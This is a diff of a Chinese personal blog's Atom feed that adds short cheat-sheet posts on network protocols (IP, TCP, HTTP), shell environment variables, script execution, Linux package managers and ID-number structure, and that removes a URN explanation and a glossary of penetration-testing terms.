-<p>URN，全称”Uniform Resource Name”，中文“统一资源名称”，是另一种形式的URI，它通过特定命名空间中的唯一名称来标识资源。示例如下：<br><code>urn:isbn:9780141036144</code><br>上面这个URN唯一标识了乔治·奥威尔所著的《1984》。</p>
-<p>简单说，URL代表一个人的位置，URN代表一个人的身份证号，通过URL和URN都可以唯一的找到这个人，所以它们都属于URI。</p>
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="Windows" scheme="https://howiezhao.github.io/tags/Windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>802.11协议分析</title>
+    <link href="https://howiezhao.github.io/2018/05/11/80211/"/>
+    <id>https://howiezhao.github.io/2018/05/11/80211/</id>
+    <published>2018-05-11T10:53:11.000Z</published>
+    <updated>2018-05-11T10:53:45.387Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="计算机网络" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>IPSec运行机制</title>
+    <link href="https://howiezhao.github.io/2018/05/11/ipsec/"/>
+    <id>https://howiezhao.github.io/2018/05/11/ipsec/</id>
+    <published>2018-05-11T10:48:46.000Z</published>
+    <updated>2018-05-11T10:51:42.647Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="计算机网络" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>IP协议分析</title>
+    <link href="https://howiezhao.github.io/2018/05/11/ip/"/>
+    <id>https://howiezhao.github.io/2018/05/11/ip/</id>
+    <published>2018-05-11T10:48:39.000Z</published>
+    <updated>2018-05-12T15:21:22.048Z</updated>
+    
+    <content type="html"><![CDATA[<p>IP(Internet Protocol，网际协议)</p>
+<h2 id="数据报格式"><a href="#数据报格式" class="headerlink" title="数据报格式"></a>数据报格式</h2><p><img src="/images/ip.PNG" alt=""><br><a id="more"></a></p>
 ]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;URI，全称”Uniform Resource Identifier”，中文“统一资源标志符”，是一个用于标识某一互联网资源名称的字符串。URI的最常见的形式是统一资源定位符（URL），经常指定为非正式的网址。更罕见的用法是统一资源名称（URN），其目的是通过提供一种途径，
+      &lt;p&gt;IP(Internet Protocol，网际协议)&lt;/p&gt;
+&lt;h2 id=&quot;数据报格式&quot;&gt;&lt;a href=&quot;#数据报格式&quot; class=&quot;headerlink&quot; title=&quot;数据报格式&quot;&gt;&lt;/a&gt;数据报格式&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/ip.PNG&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="计算机网络" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>TCP协议分析</title>
+    <link href="https://howiezhao.github.io/2018/05/11/tcp/"/>
+    <id>https://howiezhao.github.io/2018/05/11/tcp/</id>
+    <published>2018-05-11T10:48:30.000Z</published>
+    <updated>2018-05-12T15:18:47.029Z</updated>
+    
+    <content type="html"><![CDATA[<p>TCP(Transmission Control Protocol，传输控制协议)</p>
+<h2 id="报文段结构"><a href="#报文段结构" class="headerlink" title="报文段结构"></a>报文段结构</h2><p><img src="/images/tcp.PNG" alt=""><br><a id="more"></a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;TCP(Transmission Control Protocol，传输控制协议)&lt;/p&gt;
+&lt;h2 id=&quot;报文段结构&quot;&gt;&lt;a href=&quot;#报文段结构&quot; class=&quot;headerlink&quot; title=&quot;报文段结构&quot;&gt;&lt;/a&gt;报文段结构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/images/tcp.PNG&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="计算机网络" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTTPS运行机制</title>
+    <link href="https://howiezhao.github.io/2018/05/11/https/"/>
+    <id>https://howiezhao.github.io/2018/05/11/https/</id>
+    <published>2018-05-11T10:45:45.000Z</published>
+    <updated>2018-05-11T10:47:26.837Z</updated>
+    
+    <summary type="html">
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="计算机网络" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>HTTP协议分析</title>
+    <link href="https://howiezhao.github.io/2018/05/11/HTTP/"/>
+    <id>https://howiezhao.github.io/2018/05/11/HTTP/</id>
+    <published>2018-05-11T08:39:06.000Z</published>
+    <updated>2018-05-12T15:09:04.213Z</updated>
+    
+    <content type="html"><![CDATA[<p>HTTP(Hypertext Transfer Protocol，超文本传输协议)</p>
+<h2 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h2><h3 id="HTTP请求报文"><a href="#HTTP请求报文" class="headerlink" title="HTTP请求报文"></a>HTTP请求报文</h3><p><img src="/images/http-request.PNG" alt=""><br><a id="more"></a><br>方法字段可以取几种不同的值，包括<strong>GET</strong>、<strong>POST</strong>、<strong>HEAD</strong>、<strong>PUT</strong>和<strong>DELETE</strong>。绝大部分的HTTP请求报文使用GET方法。<br><strong>Host</strong>首部行指明对象所在的主机，该信息是Web代理高速缓存所要求的；<strong>Connection</strong>首部行指明采用非持续连接还是持续连接；<strong>User-Agent</strong>首部行指明用户代理；<strong>Accept-Language</strong>首部行指明用户想得到的语言版本。<br>使用GET方法时实体体(entity body)为空，而使用POST方法时才使用该实体体。<br>HEAD方法类似于GET方法。当服务器收到使用HEAD方法的请求时，将会用一个HTTP报文进行响应，但是并不返回请求对象。应用程序开发者常用HEAD方法进行调试跟踪。PUT方法常与Web发行工具联合使用，它运行用户上传对象到指定的Web服务器上指定的路径(目录)。PUT方法也被那些需要向Web服务器上传对象的应用程序使用。DELETE方法允许用户或者应用程序删除Web服务器上的对象。</p>
+<h3 id="HTTP响应报文"><a href="#HTTP响应报文" class="headerlink" title="HTTP响应报文"></a>HTTP响应报文</h3><p><img src="/images/http-response.PNG" alt=""><br><strong>Date</strong>首部行指示服务器产生并发送该响应报文的日期和时间；<strong>Last-Modified</strong>首部行指示了对象创建或者最后修改的日期和时间；<strong>Server</strong>首部行指示服务器类型，类似于User-Agent首部行；<strong>Content-Length</strong>首部行指示了被发送对象中的字节数；<strong>Content-Type</strong>首部行指示了实体体中的对象的MIME类型。<br>常见的状态码和其对应的短语：<br>200 OK：请求成功，信息在返回的响应报文中。<br>301 Moved Permanently：请求的对象已经被永久转移了，新的URL定义在响应报文的Location首部行中。客户软件将自动获取新的URL。<br>400 Bad Request：一个通用差错代码，指示该请求不能被服务器理解。<br>404 Not Found：被请求的文档不在服务器上。<br>505 HTTP Version Not Supported：服务器不支持请求报文使用的HTTP协议版本。</p>
+<h2 id="Web缓存"><a href="#Web缓存" class="headerlink" title="Web缓存"></a>Web缓存</h2><p><strong>条件GET(conditional GET)方法</strong>：请求报文使用GET方法，并且请求报文中包含一个<strong>If-Modified-Since</strong>首部行。<br>Web缓存器为了验证所缓存的对象是否是最新的，会使用条件GET方法向目标服务器发送一个请求报文，If-Modified-Since首部行的值为当初缓存对象时响应报文中Last-Modified首部行的值。如果所要验证的对象是最新的，即没有被修改过，则目标服务器会返回一个“304 Not Modified”响应报文，其中实体体为空。</p>
+<h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol>
+<li>HTTP是一个无状态协议(stateless protocol)。</li>
+<li>HTTP可以采用非持续连接或持续连接，默认采用持续连接。</li>
+</ol>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;HTTP(Hypertext Transfer Protocol，超文本传输协议)&lt;/p&gt;
+&lt;h2 id=&quot;报文格式&quot;&gt;&lt;a href=&quot;#报文格式&quot; class=&quot;headerlink&quot; title=&quot;报文格式&quot;&gt;&lt;/a&gt;报文格式&lt;/h2&gt;&lt;h3 id=&quot;HTTP请求报文&quot;&gt;&lt;a href=&quot;#HTTP请求报文&quot; class=&quot;headerlink&quot; title=&quot;HTTP请求报文&quot;&gt;&lt;/a&gt;HTTP请求报文&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/images/http-request.PNG&quot; alt=&quot;&quot;&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="计算机网络" scheme="https://howiezhao.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>set、env与export</title>
+    <link href="https://howiezhao.github.io/2018/05/09/set-env-export/"/>
+    <id>https://howiezhao.github.io/2018/05/09/set-env-export/</id>
+    <published>2018-05-09T11:20:18.000Z</published>
+    <updated>2018-07-17T07:34:31.249Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p><strong>环境变量</strong>，顾名思义由<strong>环境</strong>和<strong>变量</strong>两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell也是如此，同样的，通过Shell所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。<br>环境变量可以大致分为<strong>Shell环境变量</strong>和<strong>用户环境变量</strong>两大类，不同的Shell有不同的Shell环境变量，例如bash与zsh的Shell环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell环境变量包含了用户环境变量。<br>在Shell中可以使用<code>declare</code>命令直接定义Shell环境变量，如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">declare</span> A=hello  <span class="comment">#定义Shell环境变量a，值为hello，注意等号两边不能有空格</span></div></pre></td></tr></table></figure></p>
+<p>使用<code>echo</code>命令即可打印环境变量的值，如：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="variable">$A</span>  <span class="comment">#打印HOME的值</span></div></pre></td></tr></table></figure></p>
+<p>值得注意的是，这种定义只对本Shell有效，关闭Shell后失效。</p>
+<p>常见的用户环境变量有：</p>
+<ul>
+<li>PATH：用以指定命令的搜索目录</li>
+<li>HOME：用以指定用户的家目录</li>
+<li>SHELL：用以指定用户的登录Shell</li>
+</ul>
+<a id="more"></a>
+<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p><code>set</code>命令用来显示或设置Shell环境变量，当不带参数运行时默认显示所有已定义的Shell环境变量，若要设置环境变量可采用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
+<p>值得注意的是，当<code>declare</code>命令不带任何参数运行时，也会显示所有的Shell环境变量，但它比<code>set</code>显示的结果要更加清晰。<br>关于set命令更多的参数使用说明可参考<a href="http://www.ruanyifeng.com/blog/2017/11/bash-set.html" target="_blank" rel="external">Bash脚本set命令教程</a></p>
+<h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><p><code>env</code>命令用来显示或设置用户环境变量，当不带参数运行时默认显示所有已定义的用户环境变量，若要设置环境变量可采用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure></p>
+<h2 id="export"><a href="#export" class="headerlink" title="export"></a>export</h2><p><code>export</code>命令用来显示或设置当前导出至用户环境变量的Shell环境变量，当不带参数运行时默认显示所有已导出至用户环境变量的Shell环境变量，若要导出某Shell环境变量到用户环境变量可采用：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">export</span> a=hello</div></pre></td></tr></table></figure></p>
+<p>这一步操作实际上完成了两步操作，即：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">declare</span> a=hello  <span class="comment">#定义一个Shell环境变量$a</span></div><div class="line"><span class="built_in">export</span> <span class="variable">$a</span>  <span class="comment">#导出至用户环境变量</span></div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;环境变量&quot;&gt;&lt;a href=&quot;#环境变量&quot; class=&quot;headerlink&quot; title=&quot;环境变量&quot;&gt;&lt;/a&gt;环境变量&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;环境变量&lt;/strong&gt;，顾名思义由&lt;strong&gt;环境&lt;/strong&gt;和&lt;strong&gt;变量&lt;/strong&gt;两部分组成，本质上就是一些变量，每个进程都有一个自己的运行环境，而在这些环境中又有一些定义的变量，Shell也是如此，同样的，通过Shell所运行的命令，相当于从父进程创建了一个子进程，它们共享同样的环境变量。&lt;br&gt;环境变量可以大致分为&lt;strong&gt;Shell环境变量&lt;/strong&gt;和&lt;strong&gt;用户环境变量&lt;/strong&gt;两大类，不同的Shell有不同的Shell环境变量，例如bash与zsh的Shell环境变量就不相同，而用户环境变量通常是由用户自定义的，Shell环境变量包含了用户环境变量。&lt;br&gt;在Shell中可以使用&lt;code&gt;declare&lt;/code&gt;命令直接定义Shell环境变量，如：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;declare&lt;/span&gt; A=hello  &lt;span class=&quot;comment&quot;&gt;#定义Shell环境变量a，值为hello，注意等号两边不能有空格&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;echo&lt;/code&gt;命令即可打印环境变量的值，如：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;variable&quot;&gt;$A&lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;#打印HOME的值&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;值得注意的是，这种定义只对本Shell有效，关闭Shell后失效。&lt;/p&gt;
+&lt;p&gt;常见的用户环境变量有：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;PATH：用以指定命令的搜索目录&lt;/li&gt;
+&lt;li&gt;HOME：用以指定用户的家目录&lt;/li&gt;
+&lt;li&gt;SHELL：用以指定用户的登录Shell&lt;/li&gt;
+&lt;/ul&gt;
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="Linux" scheme="https://howiezhao.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>source、sh与 ./</title>
+    <link href="https://howiezhao.github.io/2018/05/09/source-sh/"/>
+    <id>https://howiezhao.github.io/2018/05/09/source-sh/</id>
+    <published>2018-05-09T08:37:48.000Z</published>
+    <updated>2018-05-09T10:12:35.166Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p><code>source a.sh</code>在当前Shell中执行a.sh，a.sh不需要有执行权限。source也可以简写为<code>.</code>，比如<code>. a.sh</code>。</p>
+<h2 id="sh"><a href="#sh" class="headerlink" title="sh"></a>sh</h2><p><code>sh a.sh</code>打开一个子Shell去执行a.sh，a.sh不需要有执行权限。在子Shell里执行的a.sh里设置的变量，不会影响到父Shell。类似的，<code>bash</code>与<code>sh</code>同理。</p>
+<h2 id=""><a href="#" class="headerlink" title="./"></a>./</h2><p><code>./a.sh</code>打开一个子Shell去执行a.sh，a.sh需要有执行权限。注意，这里<code>./</code>与<code>a.sh</code>之间没有空格，换个角度看，其实没有使用任何命令，只是指定了当前文件夹下的这个文件而已。这就相当于双击这个文件去运行一样，那这个文件肯定要具有可执行权限。至于为什么要加<code>./</code>，我猜想是为了预防与环境变量中相同的名称引起冲突。<br>前面采用了相对路径的方法，当然也可以采用绝对路径，比如<code>/root/a.sh</code>这样，同样可以执行。<br>另外，<code>./</code>运行的文件里通常有<strong>Shebang</strong>一行，也就是以<code>#!</code>开头的第一行，用以指明执行这个脚本文件的解释程序。如果没有Shebang一行，那么以<code>./a.sh</code>运行脚本时，会自动使用环境变量中的<code>$SHELL</code>变量所指定的解释器来运行。<br>最后，在以<code>sh a.sh</code>或<code>bash a.sh</code>这样的命令运行脚本时，即使文件中指明了Shebang，也会自动忽略，因为在命令中已经明确指定了所采用的解释器。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;source&quot;&gt;&lt;a href=&quot;#source&quot; class=&quot;headerlink&quot; title=&quot;source&quot;&gt;&lt;/a&gt;source&lt;/h2&gt;&lt;p&gt;&lt;code&gt;source a.sh&lt;/code&gt;在当前Shell中执行a.sh，a.sh不需要有执行权限。s
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="Linux" scheme="https://howiezhao.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Linux的包管理机制</title>
+    <link href="https://howiezhao.github.io/2018/05/09/linux-package/"/>
+    <id>https://howiezhao.github.io/2018/05/09/linux-package/</id>
+    <published>2018-05-09T05:43:55.000Z</published>
+    <updated>2018-07-02T14:53:20.674Z</updated>
+    
+    <content type="html"><![CDATA[<p>Linux大致可以分为2个派别：一派以Red Hat为首，主要包括CentOS(社区版)、Fedora(桌面版)等；另一派以Debian为首，主要包括Ubuntu、Kali等。Red Hat系采用<code>rpm</code>为其包格式，<code>yum</code>为其包管理工具；Debian系采用<code>dpkg</code>为其包格式，<code>apt-get</code>为其包管理工具。</p>
+<h2 id="rpm与yum"><a href="#rpm与yum" class="headerlink" title="rpm与yum"></a>rpm与yum</h2><p><code>rpm</code>全称Red-Hat Package Manager(RPM软件包管理器)，是Red Hat系中的包格式，同时也是其<strong>本地</strong>包管理工具，常用命令有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">rpm -i a.rpm  <span class="comment">#安装a</span></div><div class="line">rpm -e a      <span class="comment">#卸载a</span></div></pre></td></tr></table></figure></p>
+<p><code>yum</code>全称Yellow dog Updater, Modified(修改后的黄色狗更新器)，是Red Hat系中的包管理工具，常用命令有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">yum update     <span class="comment">#更新包列表</span></div><div class="line">yum upgrade    <span class="comment">#更新包</span></div><div class="line">yum install a  <span class="comment">#安装a</span></div><div class="line">yum remove a   <span class="comment">#卸载a</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<h2 id="dpkg与apt-get"><a href="#dpkg与apt-get" class="headerlink" title="dpkg与apt-get"></a>dpkg与apt-get</h2><p><code>dpkg</code>全称Debian Packager(Debian包工具)，是Debian系中的包格式，同时也是其<strong>本地</strong>包管理工具，常用命令有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">dpkg -i a.dpkg  <span class="comment">#安装a</span></div><div class="line">dpkg -r a       <span class="comment">#卸载a</span></div></pre></td></tr></table></figure></p>
+<p><code>apt-get</code>是apt中的一个子程序，apt全称Advanced Packaging Tool(先进的包工具)，是Debian系中的包管理工具，常用命令有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt-get update     <span class="comment">#更新包列表</span></div><div class="line">apt-get upgrade    <span class="comment">#更新包</span></div><div class="line">apt-get install a  <span class="comment">#安装a</span></div><div class="line">apt-get remove a   <span class="comment">#卸载a</span></div></pre></td></tr></table></figure></p>
+<p>值得注意的是，随着新版系统的到来，出现了更为强大的<code>apt</code>命令，可以简单认为<code>apt</code>集合了<code>apt-get</code>、<code>apt-cache</code>、<code>apt-config</code>中的最常用命令选项。例如，<code>apt install</code>相比<code>apt-get install</code>增加了色彩显示以及进度条显示等功能。因此，更建议使用<code>apt</code>命令，常用命令有：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">apt update     <span class="comment">#更新包列表</span></div><div class="line">apt upgrade    <span class="comment">#更新包</span></div><div class="line">apt install a  <span class="comment">#安装a</span></div><div class="line">apt remove a   <span class="comment">#卸载a</span></div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;Linux大致可以分为2个派别：一派以Red Hat为首，主要包括CentOS(社区版)、Fedora(桌面版)等；另一派以Debian为首，主要包括Ubuntu、Kali等。Red Hat系采用&lt;code&gt;rpm&lt;/code&gt;为其包格式，&lt;code&gt;yum&lt;/code&gt;为其包管理工具；Debian系采用&lt;code&gt;dpkg&lt;/code&gt;为其包格式，&lt;code&gt;apt-get&lt;/code&gt;为其包管理工具。&lt;/p&gt;
+&lt;h2 id=&quot;rpm与yum&quot;&gt;&lt;a href=&quot;#rpm与yum&quot; class=&quot;headerlink&quot; title=&quot;rpm与yum&quot;&gt;&lt;/a&gt;rpm与yum&lt;/h2&gt;&lt;p&gt;&lt;code&gt;rpm&lt;/code&gt;全称Red-Hat Package Manager(RPM软件包管理器)，是Red Hat系中的包格式，同时也是其&lt;strong&gt;本地&lt;/strong&gt;包管理工具，常用命令有：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;rpm -i a.rpm  &lt;span class=&quot;comment&quot;&gt;#安装a&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rpm -e a      &lt;span class=&quot;comment&quot;&gt;#卸载a&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;yum&lt;/code&gt;全称Yellow dog Updater, Modified(修改后的黄色狗更新器)，是Red Hat系中的包管理工具，常用命令有：&lt;br&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;yum update     &lt;span class=&quot;comment&quot;&gt;#更新包列表&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;yum upgrade    &lt;span class=&quot;comment&quot;&gt;#更新包&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;yum install a  &lt;span class=&quot;comment&quot;&gt;#安装a&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;yum remove a   &lt;span class=&quot;comment&quot;&gt;#卸载a&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="Linux" scheme="https://howiezhao.github.io/tags/Linux/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>手机号与身份证号的秘密</title>
+    <link href="https://howiezhao.github.io/2018/05/09/phone-number-and-id-card/"/>
+    <id>https://howiezhao.github.io/2018/05/09/phone-number-and-id-card/</id>
+    <published>2018-05-09T05:39:46.000Z</published>
+    <updated>2018-06-02T14:43:39.815Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="手机号码"><a href="#手机号码" class="headerlink" title="手机号码"></a>手机号码</h2><p>国内手机号码为11位数，按照各部分编码的含义可以分为3段：前3位是网络识别号，用以标识一个通信运营商；第4-7位是地区编码，由HLR归属位置寄存器确定；第8-11位是用户号码，此段随机分配。</p>
+<h2 id="身份证号码"><a href="#身份证号码" class="headerlink" title="身份证号码"></a>身份证号码</h2><p>国内居民身份证号码为18位数，按照各部分编码的含义可以分为4段：前6位是地址码，即编码对象常住户口所在县的行政区划代码，其中第1-2位表示省，第3-4位表示市，第5-6位表示县；第7-14位是出生日期码；第15-17位是顺序码，即在地址码所标识的区域范围内，对同年、月、日出生的人员编定的顺序号，其中第17位奇数分给男性，偶数分给女性；第18位是校验码，根据前面17位数字码，按照如下算法计算出来的：</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;手机号码&quot;&gt;&lt;a href=&quot;#手机号码&quot; class=&quot;headerlink&quot; title=&quot;手机号码&quot;&gt;&lt;/a&gt;手机号码&lt;/h2&gt;&lt;p&gt;国内手机号码为11位数，按照各部分编码的含义可以分为3段：前3位是网络识别号，用以标识一个通信运营商；第4-7位是地区编码，
+    
+    </summary>
+    
+      <category term="CheatSheet" scheme="https://howiezhao.github.io/categories/CheatSheet/"/>
+    
+    
+      <category term="社会工程学" scheme="https://howiezhao.github.io/tags/%E7%A4%BE%E4%BC%9A%E5%B7%A5%E7%A8%8B%E5%AD%A6/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>MIME Type</title>
+    <link href="https://howiezhao.github.io/2018/05/09/MIME-Type/"/>
+    <id>https://howiezhao.github.io/2018/05/09/MIME-Type/</id>
+    <published>2018-05-09T05:36:09.000Z</published>
+    <updated>2018-05-09T05:37:19.584Z</updated>
+    
+    <summary type="html">
     
     </summary>
     
@@ -280,23 +482,20 @@
   </entry>
   
   <entry>
-    <title>渗透中PoC、Exp、Payload与Shellcode的区别</title>
-    <link href="https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/"/>
-    <id>https://howiezhao.github.io/2018/04/29/payload-shellcode-exp-poc/</id>
-    <published>2018-04-29T08:33:17.000Z</published>
-    <updated>2018-04-29T10:10:13.742Z</updated>
+    <title>后渗透测试阶段的信息收集</title>
+    <link href="https://howiezhao.github.io/2018/05/09/information-gathering-of-post-exploitation/"/>
+    <id>https://howiezhao.github.io/2018/05/09/information-gathering-of-post-exploitation/</id>
+    <published>2018-05-09T05:32:55.000Z</published>
+    <updated>2018-05-12T13:11:15.511Z</updated>
     
-    <content type="html"><![CDATA[<p>PoC，全称”Proof of Concept”，中文“概念验证”，常指一段漏洞证明的代码。<br>Exp，全称”Exploit”，中文“利用”，指利用系统漏洞进行攻击的动作。<br>Payload，中文“有效载荷”，指成功exploit之后，真正在目标系统执行的代码或指令。<br>Shellcode，简单翻译“shell代码”，是Payload的一种，由于其建立正向/反向shell而得名。</p>
-<p>几点注意：<br>PoC是用来证明漏洞存在的，Exp是用来利用漏洞的，两者通常不是一类，或者说，PoC通常是无害的，Exp通常是有害的，有了PoC，才有Exp。<br>Payload有很多种，它可以是Shellcode，也可以直接是一段系统命令。同一个Payload可以用于多个漏洞，但每个漏洞都有其自己的Exp，也就是说不存在通用的Exp。<br>Shellcode也有很多种，包括正向的，反向的，甚至meterpreter。<br>Shellcode与Shellshcok不是一个，Shellshock特指14年发现的Shellshock漏洞。</p>
-<a id="more"></a>
